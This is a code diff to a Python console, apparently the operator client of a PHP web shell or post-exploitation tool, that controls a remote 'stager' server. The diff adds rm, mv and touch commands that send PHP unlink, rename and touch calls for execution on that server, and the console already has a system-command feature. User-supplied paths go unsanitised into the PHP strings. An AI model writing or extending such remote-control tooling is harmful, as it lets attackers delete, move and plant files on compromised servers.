@@ -5,7 +5,6 @@ import os
 import json
 import pathlib
 
-
 from .output import *
 from . import util
 from . import terminalsize
@@ -226,7 +225,7 @@ class Str4WConsole(cmd.Cmd):
     @check_stager_url
     def do_ls(self, path: str):
         """
-        Lists the given directory content.
+        Lists the provided directory content.
         """
 
         if len(path) == 0:
@@ -236,6 +235,52 @@ class Str4WConsole(cmd.Cmd):
         print_info("Directory listing: ")
         for file in json.loads(response):
             print(f" - {file}")
+
+    @check_stager_url
+    def do_rm(self, path: str):
+        """
+        Remove the provided file from the stager server.
+        """
+
+        if len(path) == 0:
+            print_error("Invalid path, please provide a valid one.")
+            return
+
+        if communication.execute_code(self.stager_url, f"echo unlink('{path}');") != '1':
+            print_error("Failed to delete target file.")
+            return
+
+        print_success("Successfully deleted target file.")
+
+    @check_stager_url
+    def do_mv(self, line: str):
+        """
+        Move the provided file to the new provided location.
+        """
+
+        try:
+            old_path, new_path = line.split(' ')
+        except:
+            print_error("Invalid syntax. Usage: `mv <old path> <new path>`.")
+            return
+
+        if communication.execute_code(self.stager_url, f"echo rename('{old_path}', '{new_path}');") != '1':
+            print_error("Failed to move target file.")
+            return
+
+        print_success("Successfully moved target file.")
+
+    @check_stager_url
+    def do_touch(self, path: str):
+        """
+        Create an empty file at the provided location.
+        """
+
+        if communication.execute_code(self.stager_url, f"echo touch('{path}');") != '1':
+            print_error("Failed to touch target file.")
+            return
+
+        print_success("Successfully touched target file.")
 
     @check_stager_url
     def do_system(self, command: str):
